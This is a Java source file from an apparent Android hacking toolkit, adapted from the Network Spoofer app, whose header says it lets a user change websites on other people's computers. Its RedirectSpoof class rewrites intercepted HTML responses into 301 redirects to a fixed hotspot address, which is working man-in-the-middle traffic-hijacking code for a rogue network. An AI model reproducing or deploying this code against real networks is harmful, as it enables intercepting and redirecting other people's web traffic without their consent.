package com.izoman.hcktool.expert.roguenetwork;

/**
 * Created by umuts on 17-Aug-17.
 */

/*
 * This file is part of Network Spoofer for Android.
 * Network Spoofer lets you change websites on other people’s computers
 * from an Android phone.
 * Copyright (C) 2014 Will Shackleton <will@digitalsquid.co.uk>
 *
 * Network Spoofer is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Network Spoofer is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Network Spoofer, in the file COPYING.
 * If not, see <http://www.gnu.org/licenses/>.
 */

import android.net.Uri;


        import android.app.Dialog;
        import android.content.Context;
        import android.content.SharedPreferences;
        import android.net.Uri;
        import android.preference.PreferenceManager;
        import android.view.View;
        import android.view.View.OnClickListener;
        import android.widget.Button;
        import android.widget.TextView;

import com.izoman.hcktool.R;

import java.net.UnknownHostException;
        import java.util.Locale;


/**
 * A spoof which redirects a website to another.
 * @author Will Shackleton <will@digitalsquid.co.uk>
 *
 */
public class RedirectSpoof extends Spoof  {
    private static final long serialVersionUID = -7780822391880161592L;

    public static final int MODE_BLUEBALL = 1;
    public static final int MODE_CUSTOM = 2;

    private String redirect, host, topLevelDomain;

//    private static String getTitle(Context context, int mode) {
//        switch(mode) {
//            case MODE_BLUEBALL:
//                return context.getResources().getString(R.string.spoof_blueball);
//            case MODE_CUSTOM:
//                return context.getResources().getString(R.string.spoof_redirect_custom);
//            default:
//                return "Unknown image spoof";
//        }
//    }
//    private static String getDescription(Context context, int mode) {
//        switch(mode) {
//            case MODE_BLUEBALL:
//                return context.getResources().getString(R.string.spoof_blueball_description);
//            case MODE_CUSTOM:
//                return context.getResources().getString(R.string.spoof_redirect_custom_description);
//            default:
//                return "";
//        }
//    }


    public RedirectSpoof() {
                setRedirect("http://192.168.43.1:8080");
    }

    /**
     * Constructor that leaves host undefined, and shows dialog later.
     * @param title
     * @param description
     * @throws UnknownHostException
     */
    public RedirectSpoof(String title, String description) {
        super(title, description);
    }

    @Override
    public Dialog displayExtraDialog(final Context context, final OnExtraDialogDoneListener onDone) {
//        if(getRedirect() == null) {
//            final SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
//            final Dialog dialog = new Dialog(context);
//
//            dialog.setTitle("Website redirect");
//
//            dialog.setContentView(R.layout.iptextfield);
//
//            final TextView input = (TextView) dialog.findViewById(R.id.text);
//            input.setText(prefs.getString("redirectUrl", ""));
//            final Button
//                    ok = (Button) dialog.findViewById(R.id.ok),
//                    cancel = (Button) dialog.findViewById(R.id.cancel);
//
//            ok.setOnClickListener(new OnClickListener() {
//                @Override
//                public void onClick(View view) {
//                    String userEntry = input.getText().toString();
//                    if(userEntry.equals("")) userEntry = "http://blueballfixed.ytmnd.com/";
//                    prefs.edit().putString("redirectUrl", userEntry).commit();
//
//                    setRedirect(userEntry);
//
//                    dialog.dismiss();
//                    onDone.onDone();
//                }
//            });
//            cancel.setOnClickListener(new OnClickListener() {
//                @Override
//                public void onClick(View v) {
//                    dialog.cancel();
//                }
//            });
//
//            return dialog;
//        }
//        else
            return null;
    }
    @Override
    public void modifyRequest(HttpRequest request) {
    }
    @Override
    public void modifyResponse(HttpResponse response, HttpRequest request) {
        if (response.getContentType().startsWith("text/html")) {
            if (request.getHost().equals(host)) return;
            if (request.getHost().endsWith(topLevelDomain)) return;
            response.reset();
            response.setResponseCode(301);
            response.setResponseMessage("Moved Permanently");
            response.addHeader("Location", getRedirect());
        }
    }
    private String getRedirect() {
        return redirect;
    }
    private void setRedirect(String redirect) {
        if(!redirect.toLowerCase(Locale.ENGLISH).startsWith("http://"))
            redirect = "http://" + redirect;
        this.redirect = redirect;
        try {
            host = Uri.parse(redirect).getHost();
            int index = host.indexOf('.');
            if (index == -1) {
                topLevelDomain = host;
            } else {
                topLevelDomain = host.substring(index + 1);
            }
        } catch(Exception e) { } // This exception will only happen on user
        // stupidity
    }
}
